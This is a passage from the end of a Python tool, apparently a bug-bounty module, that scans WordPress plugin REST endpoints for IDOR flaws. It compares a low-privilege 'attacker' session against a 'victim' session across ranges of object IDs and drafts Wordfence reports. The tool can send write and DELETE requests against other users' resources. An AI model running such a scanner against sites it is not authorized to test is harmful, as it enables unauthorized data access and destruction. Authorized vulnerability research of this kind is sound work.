            "if ( get_current_user_id() !== (int) $resource->user_id ) {",
            "    return new WP_Error(",
            "        'rest_forbidden',",
            "        __( 'You do not have permission to access this resource.' ),",
            "        [ 'status' => 403 ]",
            "    );",
            "}",
            "```",
            "",
            "Apply `permission_callback` at route registration **and** re-verify ownership",
            "inside the handler. Do not rely solely on nonce validation — nonces prove",
            "authenticity, not authorization.",
            "",
        ]

    with open(outfile, "w") as f:
        f.write("\n".join(lines))
    log_ok(f"Markdown report saved to {outfile}")


# ── Credential resolution ──────────────────────────────────────────────────────

def resolve_credentials(args: argparse.Namespace) -> tuple[str, str, Optional[str], Optional[str]]:
    attacker_cookie = args.attacker_cookie or os.environ.get("BSCOPE_ATTACKER_COOKIE", "")
    attacker_nonce  = args.attacker_nonce  or os.environ.get("BSCOPE_ATTACKER_NONCE", "")
    victim_cookie   = (
        args.victim_cookie
        or args.owner_cookie
        or os.environ.get("BSCOPE_VICTIM_COOKIE")
        or os.environ.get("BSCOPE_OWNER_COOKIE")
    )
    victim_nonce    = (
        args.victim_nonce
        or args.owner_nonce
        or os.environ.get("BSCOPE_VICTIM_NONCE")
        or os.environ.get("BSCOPE_OWNER_NONCE")
    )

    if not attacker_cookie:
        raise ValueError("Attacker cookie required. Pass --attacker-cookie or set BSCOPE_ATTACKER_COOKIE")
    if not attacker_nonce:
        raise ValueError("Attacker nonce required. Pass --attacker-nonce or set BSCOPE_ATTACKER_NONCE")
    if bool(victim_cookie) != bool(victim_nonce):
        raise ValueError("--victim-cookie and --victim-nonce must both be set for dual-session mode")

    return attacker_cookie, attacker_nonce, victim_cookie, victim_nonce


# ── CLI ────────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="WordPress REST API IDOR Scanner v2 — BountyScope Module",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Credentials (prefer env vars over CLI to avoid shell history leakage):
  export BSCOPE_ATTACKER_COOKIE="wordpress_logged_in_...=..."
  export BSCOPE_ATTACKER_NONCE="4d6f917637"
    export BSCOPE_VICTIM_COOKIE="wordpress_logged_in_...=..."
    export BSCOPE_VICTIM_NONCE="abc123def"

Examples:
  # Dual-session, ID range, read-only, generate Wordfence draft
  python3 idor_scanner.py \\
    --target http://fluent-test.local --plugin fluentcrm \\
    --id-range 1-50 --skip-write \\
    --markdown-out report.md --json-out results.json

  # Write-enabled (explicit --confirm-destructive required for DELETE)
  python3 idor_scanner.py \\
    --target http://fluent-test.local --plugin fluentform \\
    --id-list 1,3,7,42 --confirm-destructive

  # Custom plugin definition from JSON file
  python3 idor_scanner.py \\
    --target http://target.local --plugin custom \\
    --plugin-config myplugin.json --id-range 1-20

Built-in plugins: fluentcrm, fluentform, ninja-tables
        """
    )

    g_target = p.add_argument_group("Target")
    g_target.add_argument("--target",        required=True, help="Base URL (e.g. http://fluent-test.local)")
    g_target.add_argument("--plugin",        required=True, help="Plugin slug or any name when using --plugin-config")
    g_target.add_argument("--plugin-config", help="JSON file with custom plugin endpoint definitions")
    g_target.add_argument("--no-verify",     action="store_true", help="Disable TLS cert verification (for self-signed certs)")

    g_ids = p.add_argument_group("Object IDs (pick one)")
    id_ex = g_ids.add_mutually_exclusive_group(required=True)
    id_ex.add_argument("--object-id", help="Single resource ID")
    id_ex.add_argument("--id-range",  help="Range: 1-50")
    id_ex.add_argument("--id-list",   help="Comma-separated: 1,3,7,42")
    id_ex.add_argument("--id-file",   help="File with one ID per line")
    g_ids.add_argument("--secondary-id", default="1", help="Secondary ID for nested routes (e.g. row_id)")

    g_creds = p.add_argument_group("Credentials (prefer env vars: BSCOPE_ATTACKER_COOKIE, etc.)")
    g_creds.add_argument("--attacker-cookie", help="Cookie for low-privilege attacker session")
    g_creds.add_argument("--attacker-nonce",  help="X-WP-Nonce for attacker session")
    g_creds.add_argument("--victim-cookie",   help="Cookie for resource owner/admin baseline session")
    g_creds.add_argument("--victim-nonce",    help="X-WP-Nonce for victim/admin baseline session")
    g_creds.add_argument("--owner-cookie",    help=argparse.SUPPRESS)
    g_creds.add_argument("--owner-nonce",     help=argparse.SUPPRESS)

    g_scan = p.add_argument_group("Scan options")
    g_scan.add_argument("--methods",             nargs="+", help="Limit to specific methods: GET PUT POST DELETE")
    g_scan.add_argument("--skip-write",          action="store_true", help="GET only — no write operations")
    g_scan.add_argument("--confirm-destructive", action="store_true", help="Enable DELETE requests (required explicitly)")
    g_scan.add_argument("--delay",               type=float, default=0.5, help="Base delay between requests in seconds (default: 0.5, ±20%% jitter applied)")

    g_out = p.add_argument_group("Output")
    g_out.add_argument("--json-out",     help="Save full results to JSON file")
    g_out.add_argument("--markdown-out", help="Save Wordfence submission draft to Markdown file")

    return p.parse_args()


# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    banner()
    args = parse_args()

    try:
        attacker_cookie, attacker_nonce, victim_cookie, victim_nonce = resolve_credentials(args)
        object_ids = parse_object_ids(args.id_range, args.id_list, args.id_file, args.object_id)
    except (ValueError, FileNotFoundError) as e:
        log_fail(str(e))
        sys.exit(1)

    if not victim_cookie:
        log_warn("No victim session — running single-session mode (higher false-positive rate)")
        log_warn("Add --victim-cookie/--victim-nonce for dual-session comparison (recommended)")

    if args.confirm_destructive:
        log_warn("DELETE requests enabled — resources may be permanently modified on the target")

    config = ScanConfig(
        target=args.target.rstrip("/"),
        plugin=args.plugin,
        plugin_config_file=args.plugin_config,
        object_ids=object_ids,
        secondary_id=args.secondary_id,
        attacker_cookie=attacker_cookie,
        attacker_nonce=attacker_nonce,
        victim_cookie=victim_cookie,
        victim_nonce=victim_nonce,
        methods_filter=args.methods,
        skip_write=args.skip_write,
        confirm_destructive=args.confirm_destructive,
        delay=args.delay,
        no_verify=args.no_verify,
        json_out=args.json_out,
        markdown_out=args.markdown_out,
    )

    try:
        results = scan(config)
    except ConnectionError as e:
        log_fatal(str(e))
        sys.exit(1)
    except (ValueError, FileNotFoundError) as e:
        log_fail(str(e))
        sys.exit(1)

    print_summary(results)

    if config.json_out:
        save_json(results, config, config.json_out)
    if config.markdown_out:
        save_markdown(results, config, config.markdown_out)


if __name__ == "__main__":
    main()
